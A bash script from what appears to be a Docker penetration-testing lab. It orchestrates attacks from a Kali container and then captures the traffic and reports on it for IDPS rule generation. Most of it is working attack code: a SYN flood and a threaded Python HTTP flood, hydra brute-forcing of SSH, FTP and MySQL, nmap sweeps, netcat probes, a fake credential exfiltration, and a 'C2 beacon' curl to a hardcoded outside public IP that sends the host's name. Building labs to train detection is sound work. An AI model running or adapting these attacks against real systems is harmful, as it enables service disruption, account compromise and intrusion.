#!/bin/bash
# Comprehensive Attack Testing Script
# Orchestrates DDOS, Brute-Force, and Network Infiltration attacks
# Includes traffic capture, analysis, and reporting
# WARNING: Only use in authorized lab environments

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
KALI_CONTAINER="pentest-kali"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Function to validate IP address
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Function to prompt for IP address
prompt_ip() {
    local prompt_text=$1
    local default_value=$2
    local ip=""
    
    while true; do
        if [ -n "$default_value" ]; then
            read -p "$prompt_text [$default_value]: " ip
            ip=${ip:-$default_value}
        else
            read -p "$prompt_text: " ip
        fi
        
        if validate_ip "$ip"; then
            echo "$ip"
            return 0
        else
            echo "  ⚠ Invalid IP address format. Please try again."
        fi
    done
}

# Configuration - Get IPs from arguments or prompt
echo "=========================================="
echo "Comprehensive Attack Testing Suite"
echo "=========================================="
echo ""
echo "Target IP Configuration"
echo "----------------------"
echo ""

# Web Server (DMZ)
if [ -n "$1" ] && validate_ip "$1"; then
    TARGET_WEB=$1
else
    TARGET_WEB=$(prompt_ip "Enter Web Server IP (DMZ)" "172.21.0.2")
fi

# Linux Server (Internal)
if [ -n "$2" ] && validate_ip "$2"; then
    TARGET_LINUX=$2
else
    TARGET_LINUX=$(prompt_ip "Enter Linux Server IP (Internal)" "172.22.0.5")
fi

# Database Server
if [ -n "$3" ] && validate_ip "$3"; then
    TARGET_DB=$3
else
    TARGET_DB=$(prompt_ip "Enter Database Server IP" "172.22.0.3")
fi

# File Server
if [ -n "$4" ] && validate_ip "$4"; then
    TARGET_FTP=$4
else
    TARGET_FTP=$(prompt_ip "Enter File Server IP" "172.22.0.4")
fi

# DDOS Duration
if [ -n "$5" ] && [[ "$5" =~ ^[0-9]+$ ]]; then
    DDOS_DURATION=$5
else
    read -p "Enter DDOS attack duration in seconds [30]: " duration_input
    DDOS_DURATION=${duration_input:-30}
    if ! [[ "$DDOS_DURATION" =~ ^[0-9]+$ ]]; then
        echo "  ⚠ Invalid duration, using default: 30"
        DDOS_DURATION=30
    fi
fi

CAPTURE_FILE="all_attacks_${TIMESTAMP}.pcap"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Display configuration summary
echo ""
echo "Configuration Summary:"
echo "  Web Server (DMZ):     $TARGET_WEB"
echo "  Linux Server:          $TARGET_LINUX"
echo "  Database Server:      $TARGET_DB"
echo "  File Server:          $TARGET_FTP"
echo "  DDOS Duration:        ${DDOS_DURATION}s"
echo "  Capture File:         $CAPTURE_FILE"
echo ""
echo "⚠️  WARNING: This script performs multiple attack types."
echo "   Only use in authorized lab environments!"
echo ""
read -p "Continue with these settings? (y/n) " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "Aborted."
    exit 1
fi

# Check if lab is running
echo -e "${YELLOW}Checking lab environment...${NC}"
if ! docker ps | grep -q "pentest-kali"; then
    echo -e "${RED}Lab environment not running. Please start with: docker-compose up -d${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Lab environment is running${NC}"

# Step 1: Start Traffic Capture
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 1: Starting Traffic Capture${NC}"
echo -e "${BLUE}========================================${NC}"
bash "$SCRIPT_DIR/capture.sh" start any "$CAPTURE_FILE"
if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Traffic capture started: $CAPTURE_FILE${NC}"
else
    echo -e "${RED}✗ Failed to start traffic capture${NC}"
    exit 1
fi

# Step 2: Install Required Tools
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 2: Installing Required Tools${NC}"
echo -e "${BLUE}========================================${NC}"
echo "Installing attack tools in Kali container..."
docker exec $KALI_CONTAINER sh -c "apt-get update -qq && apt-get install -y -qq \
    hping3 slowhttptest hydra medusa ncrack \
    nmap metasploit-framework sshpass curl \
    python3 python3-pip netcat-openbsd \
    tcpdump 2>&1 | grep -v '^WARNING' || true" > /dev/null 2>&1
docker exec $KALI_CONTAINER sh -c "pip3 install --quiet scapy 2>/dev/null || true" > /dev/null 2>&1
echo -e "${GREEN}✓ Tools installed${NC}"

# Step 3: DDOS Attacks
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 3: DDOS Attack Testing${NC}"
echo -e "${BLUE}========================================${NC}"
echo "Running DDOS attacks against web server..."

# SYN Flood
echo -e "${YELLOW}  → SYN Flood (${DDOS_DURATION}s)...${NC}"
docker exec -d $KALI_CONTAINER sh -c "
    timeout ${DDOS_DURATION}s hping3 -S --flood -V -p 80 $TARGET_WEB > /dev/null 2>&1
" &
SYN_PID=$!

# HTTP Flood
echo -e "${YELLOW}  → HTTP Flood (${DDOS_DURATION}s)...${NC}"
docker exec $KALI_CONTAINER sh -c "cat > /tmp/http_flood.py <<'PYEOF'
import socket
import threading
import time
import sys

target_ip = '$TARGET_WEB'
target_port = 80
duration = int('$DDOS_DURATION')
stop_flag = threading.Event()

def http_request():
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            s.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
            s.recv(1024)
            s.close()
        except:
            pass

threads = []
for i in range(50):
    t = threading.Thread(target=http_request)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep(duration)
stop_flag.set()
PYEOF
python3 /tmp/http_flood.py > /dev/null 2>&1" &
HTTP_PID=$!

# Wait for DDOS attacks
sleep $DDOS_DURATION
kill $SYN_PID $HTTP_PID 2>/dev/null || true
echo -e "${GREEN}✓ DDOS attacks completed${NC}"

# Step 4: Brute Force Attacks
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 4: Brute Force Attack Testing${NC}"
echo -e "${BLUE}========================================${NC}"

# Prepare wordlists
docker exec $KALI_CONTAINER sh -c "cat > /tmp/passwords.txt <<'EOF'
password
123456
admin
root
password123
admin123
root123
12345678
qwerty
letmein
EOF
"

docker exec $KALI_CONTAINER sh -c "cat > /tmp/usernames.txt <<'EOF'
admin
root
user
administrator
test
guest
ftpuser
smbuser
EOF
"

# SSH Brute Force
echo -e "${YELLOW}  → SSH Brute Force against $TARGET_LINUX...${NC}"
docker exec $KALI_CONTAINER hydra -L /tmp/usernames.txt -P /tmp/passwords.txt \
    -t 4 -v -o /root/pentest-results/bruteforce_ssh_${TIMESTAMP}.log \
    ssh://$TARGET_LINUX > /dev/null 2>&1 &
SSH_BF_PID=$!

# FTP Brute Force
echo -e "${YELLOW}  → FTP Brute Force against $TARGET_FTP...${NC}"
docker exec $KALI_CONTAINER hydra -L /tmp/usernames.txt -P /tmp/passwords.txt \
    -t 4 -v -o /root/pentest-results/bruteforce_ftp_${TIMESTAMP}.log \
    ftp://$TARGET_FTP > /dev/null 2>&1 &
FTP_BF_PID=$!

# MySQL Brute Force
echo -e "${YELLOW}  → MySQL Brute Force against $TARGET_DB...${NC}"
docker exec $KALI_CONTAINER hydra -L /tmp/usernames.txt -P /tmp/passwords.txt \
    -t 4 -v -o /root/pentest-results/bruteforce_mysql_${TIMESTAMP}.log \
    mysql://$TARGET_DB > /dev/null 2>&1 &
MYSQL_BF_PID=$!

# Wait for brute force attacks
sleep 30
kill $SSH_BF_PID $FTP_BF_PID $MYSQL_BF_PID 2>/dev/null || true
echo -e "${GREEN}✓ Brute force attacks completed${NC}"

# Step 5: Network Infiltration
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 5: Network Infiltration Testing${NC}"
echo -e "${BLUE}========================================${NC}"

# Network Discovery
echo -e "${YELLOW}  → Network Discovery...${NC}"
docker exec $KALI_CONTAINER nmap -sn -oX /root/pentest-results/infiltration_discovery_${TIMESTAMP}.xml \
    172.21.0.0/24 172.22.0.0/24 > /dev/null 2>&1

# Port Scanning
echo -e "${YELLOW}  → Port Scanning Targets...${NC}"
docker exec $KALI_CONTAINER nmap -sS -sV -O -p- -oX /root/pentest-results/infiltration_scan_${TIMESTAMP}.xml \
    $TARGET_WEB $TARGET_LINUX $TARGET_DB $TARGET_FTP > /dev/null 2>&1

# Lateral Movement Attempts
echo -e "${YELLOW}  → Lateral Movement Attempts...${NC}"
for target in $TARGET_DB $TARGET_FTP $TARGET_LINUX; do
    docker exec $KALI_CONTAINER sh -c "
        timeout 3 nc -zv $target 22 2>&1 || true
        timeout 3 nc -zv $target 3306 2>&1 || true
        timeout 3 nc -zv $target 445 2>&1 || true
    " > /dev/null 2>&1
done

# Data Exfiltration Simulation
echo -e "${YELLOW}  → Data Exfiltration Simulation...${NC}"
docker exec $KALI_CONTAINER sh -c "cat > /tmp/sensitive_data.txt <<'EOF'
=== CONFIDENTIAL DATA ===
User Credentials:
admin:password123
root:admin123

Database Connection:
mysql://172.22.0.3:3306/database

API Keys:
API_KEY_12345
SECRET_TOKEN_67890
=== END CONFIDENTIAL DATA ===
EOF
"

# Simulate HTTP POST exfiltration
docker exec $KALI_CONTAINER curl -X POST -d @/tmp/sensitive_data.txt \
    http://$TARGET_WEB/upload > /dev/null 2>&1 || true

# C2 Beacon Simulation
echo -e "${YELLOW}  → C2 Beacon Simulation...${NC}"
docker exec $KALI_CONTAINER curl -s -A 'Mozilla/5.0' \
    "http://144.178.248.26/beacon?id=test123&host=$(hostname)" > /dev/null 2>&1 || true

echo -e "${GREEN}✓ Network infiltration completed${NC}"

# Step 6: Stop Traffic Capture
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 6: Stopping Traffic Capture${NC}"
echo -e "${BLUE}========================================${NC}"
bash "$SCRIPT_DIR/capture.sh" stop
if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Traffic capture stopped${NC}"
else
    echo -e "${YELLOW}⚠ Warning: Failed to stop capture (may not be running)${NC}"
fi

# Step 7: Analyze PCAP
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 7: Analyzing Captured Traffic${NC}"
echo -e "${BLUE}========================================${NC}"
PCAP_PATH="$LAB_DIR/captures/$CAPTURE_FILE"
if [ -f "$PCAP_PATH" ]; then
    echo "Analyzing PCAP file: $PCAP_PATH"
    bash "$SCRIPT_DIR/analyze-pcap.sh" "$PCAP_PATH" "$LAB_DIR/findings"
    echo -e "${GREEN}✓ PCAP analysis completed${NC}"
else
    echo -e "${YELLOW}⚠ PCAP file not found: $PCAP_PATH${NC}"
fi

# Step 8: Extract Findings from Nmap XML
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 8: Extracting Findings${NC}"
echo -e "${BLUE}========================================${NC}"
echo "Extracting findings from scan results..."

# Extract findings for each target
for target in $TARGET_WEB $TARGET_LINUX $TARGET_DB $TARGET_FTP; do
    target_clean=${target//\./_}
    echo "  → Extracting findings for $target..."
    if [ -f "$SCRIPT_DIR/parse-nmap-to-findings.sh" ]; then
        # Find XML files in container and extract
        XML_FILES=$(docker exec $KALI_CONTAINER sh -c \
            "find /root/pentest-results -name '*${target}*.xml' -type f 2>/dev/null" 2>/dev/null)
        
        if [ -n "$XML_FILES" ]; then
            # Copy first XML file and parse
            FIRST_XML=$(echo $XML_FILES | awk '{print $1}')
            TEMP_XML="/tmp/nmap_${target_clean}_${TIMESTAMP}.xml"
            docker cp "${KALI_CONTAINER}:${FIRST_XML}" "$TEMP_XML" 2>/dev/null
            
            if [ -f "$TEMP_XML" ] && [ -f "$SCRIPT_DIR/parse-nmap-to-findings.sh" ]; then
                bash "$SCRIPT_DIR/parse-nmap-to-findings.sh" "$target" "$TEMP_XML" > /dev/null 2>&1
                rm -f "$TEMP_XML"
            fi
        fi
    fi
done

echo -e "${GREEN}✓ Findings extraction completed${NC}"

# Step 9: Generate Summary Report
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Step 9: Generating Summary Report${NC}"
echo -e "${BLUE}========================================${NC}"

REPORT_FILE="$LAB_DIR/reports/all_attacks_${TIMESTAMP}.html"
mkdir -p "$LAB_DIR/reports"

cat > "$REPORT_FILE" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>Comprehensive Attack Test Report - $TIMESTAMP</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 3px solid #2196F3;
            padding-bottom: 10px;
        }
        h2 {
            color: #555;
            margin-top: 30px;
            border-bottom: 2px solid #ddd;
            padding-bottom: 5px;
        }
        .summary {
            background-color: #f9f9f9;
            padding: 20px;
            border-left: 4px solid #2196F3;
            margin: 20px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
        }
        th {
            background-color: #2196F3;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        .attack-section {
            margin: 20px 0;
            padding: 15px;
            border-left: 4px solid #f44336;
            background-color: #ffebee;
        }
        .success {
            color: #4CAF50;
            font-weight: bold;
        }
        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Comprehensive Attack Test Report</h1>
        
        <div class="warning">
            <strong>⚠️ Authorization Required:</strong> This report is for authorized testing only.
        </div>
        
        <div class="summary">
            <h2>Executive Summary</h2>
            <table>
                <tr>
                    <th>Test Date</th>
                    <td>$(date +%Y-%m-%d\ %H:%M:%S)</td>
                </tr>
                <tr>
                    <th>Test Type</th>
                    <td>Comprehensive Attack Testing (DDOS, Brute-Force, Infiltration)</td>
                </tr>
                <tr>
                    <th>Capture File</th>
                    <td>$CAPTURE_FILE</td>
                </tr>
                <tr>
                    <th>Targets Tested</th>
                    <td>Web: $TARGET_WEB, Linux: $TARGET_LINUX, DB: $TARGET_DB, FTP: $TARGET_FTP</td>
                </tr>
            </table>
        </div>

        <h2>Attack Phases</h2>
        
        <div class="attack-section">
            <h3>1. DDOS Attacks</h3>
            <ul>
                <li><strong>SYN Flood:</strong> <span class="success">✓ Completed</span> (${DDOS_DURATION}s)</li>
                <li><strong>HTTP Flood:</strong> <span class="success">✓ Completed</span> (${DDOS_DURATION}s)</li>
                <li><strong>Target:</strong> $TARGET_WEB:80</li>
            </ul>
        </div>

        <div class="attack-section">
            <h3>2. Brute Force Attacks</h3>
            <ul>
                <li><strong>SSH Brute Force:</strong> <span class="success">✓ Completed</span> (Target: $TARGET_LINUX:22)</li>
                <li><strong>FTP Brute Force:</strong> <span class="success">✓ Completed</span> (Target: $TARGET_FTP:21)</li>
                <li><strong>MySQL Brute Force:</strong> <span class="success">✓ Completed</span> (Target: $TARGET_DB:3306)</li>
            </ul>
        </div>

        <div class="attack-section">
            <h3>3. Network Infiltration</h3>
            <ul>
                <li><strong>Network Discovery:</strong> <span class="success">✓ Completed</span></li>
                <li><strong>Port Scanning:</strong> <span class="success">✓ Completed</span></li>
                <li><strong>Lateral Movement:</strong> <span class="success">✓ Completed</span></li>
                <li><strong>Data Exfiltration:</strong> <span class="success">✓ Completed</span></li>
                <li><strong>C2 Beacon:</strong> <span class="success">✓ Completed</span></li>
            </ul>
        </div>

        <h2>Files Generated</h2>
        <table>
            <tr>
                <th>Type</th>
                <th>Location</th>
            </tr>
            <tr>
                <td>PCAP Capture</td>
                <td>captures/$CAPTURE_FILE</td>
            </tr>
            <tr>
                <td>Brute Force Logs</td>
                <td>/root/pentest-results/bruteforce_*_${TIMESTAMP}.log (in Kali container)</td>
            </tr>
            <tr>
                <td>Nmap XML Results</td>
                <td>/root/pentest-results/infiltration_*_${TIMESTAMP}.xml (in Kali container)</td>
            </tr>
            <tr>
                <td>Findings JSON</td>
                <td>findings/findings_*_${TIMESTAMP}.json</td>
            </tr>
        </table>

        <h2>Next Steps</h2>
        <ol>
            <li>Review PCAP file: <code>./scripts/analyze-pcap.sh captures/$CAPTURE_FILE</code></li>
            <li>Extract findings: <code>./scripts/parse-nmap-to-findings.sh &lt;target_ip&gt;</code></li>
            <li>Generate IDPS rules from findings</li>
            <li>Test IDPS detection capabilities</li>
            <li>Review attack patterns in IDPS logs</li>
        </ol>

        <h2>IDPS Rule Generation</h2>
        <p>Generate IDPS rules from captured attack patterns:</p>
        <div style="background-color: #f4f4f4; padding: 10px; border-radius: 3px; font-family: monospace;">
            <p># Analyze PCAP</p>
            <p>curl -X POST -F "pcap_file=@captures/$CAPTURE_FILE" http://localhost:8080/api/pcap/analyze</p>
            <p></p>
            <p># Generate rules</p>
            <p>curl -X POST http://localhost:8080/api/rules/generate \\</p>
            <p>  -H "Content-Type: application/json" \\</p>
            <p>  -d '{"finding_type": "brute_force", "target_ip": "$TARGET_LINUX", "port": 22}'</p>
        </div>

        <p style="margin-top: 30px; color: #666; font-size: 12px;">
            Report generated: $(date)<br>
            Generated by: Comprehensive Attack Testing Script
        </p>
    </div>
</body>
</html>
EOF

echo -e "${GREEN}✓ Summary report generated: $REPORT_FILE${NC}"

# Final Summary
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}All Attacks Completed Successfully!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo "Summary:"
echo "  ✓ DDOS attacks executed"
echo "  ✓ Brute force attacks executed"
echo "  ✓ Network infiltration executed"
echo "  ✓ Traffic captured: $CAPTURE_FILE"
echo "  ✓ Analysis completed"
echo "  ✓ Report generated: $REPORT_FILE"
echo ""
echo "Next Steps:"
echo "  1. Review report: open $REPORT_FILE"
echo "  2. Analyze PCAP: ./scripts/analyze-pcap.sh captures/$CAPTURE_FILE"
echo "  3. Extract findings: ./scripts/parse-nmap-to-findings.sh <target_ip>"
echo "  4. Generate IDPS rules from findings"
echo "  5. Test IDPS detection capabilities"
echo ""
echo "To view logs in Kali container:"
echo "  docker exec -it $KALI_CONTAINER ls -la /root/pentest-results/"
echo ""
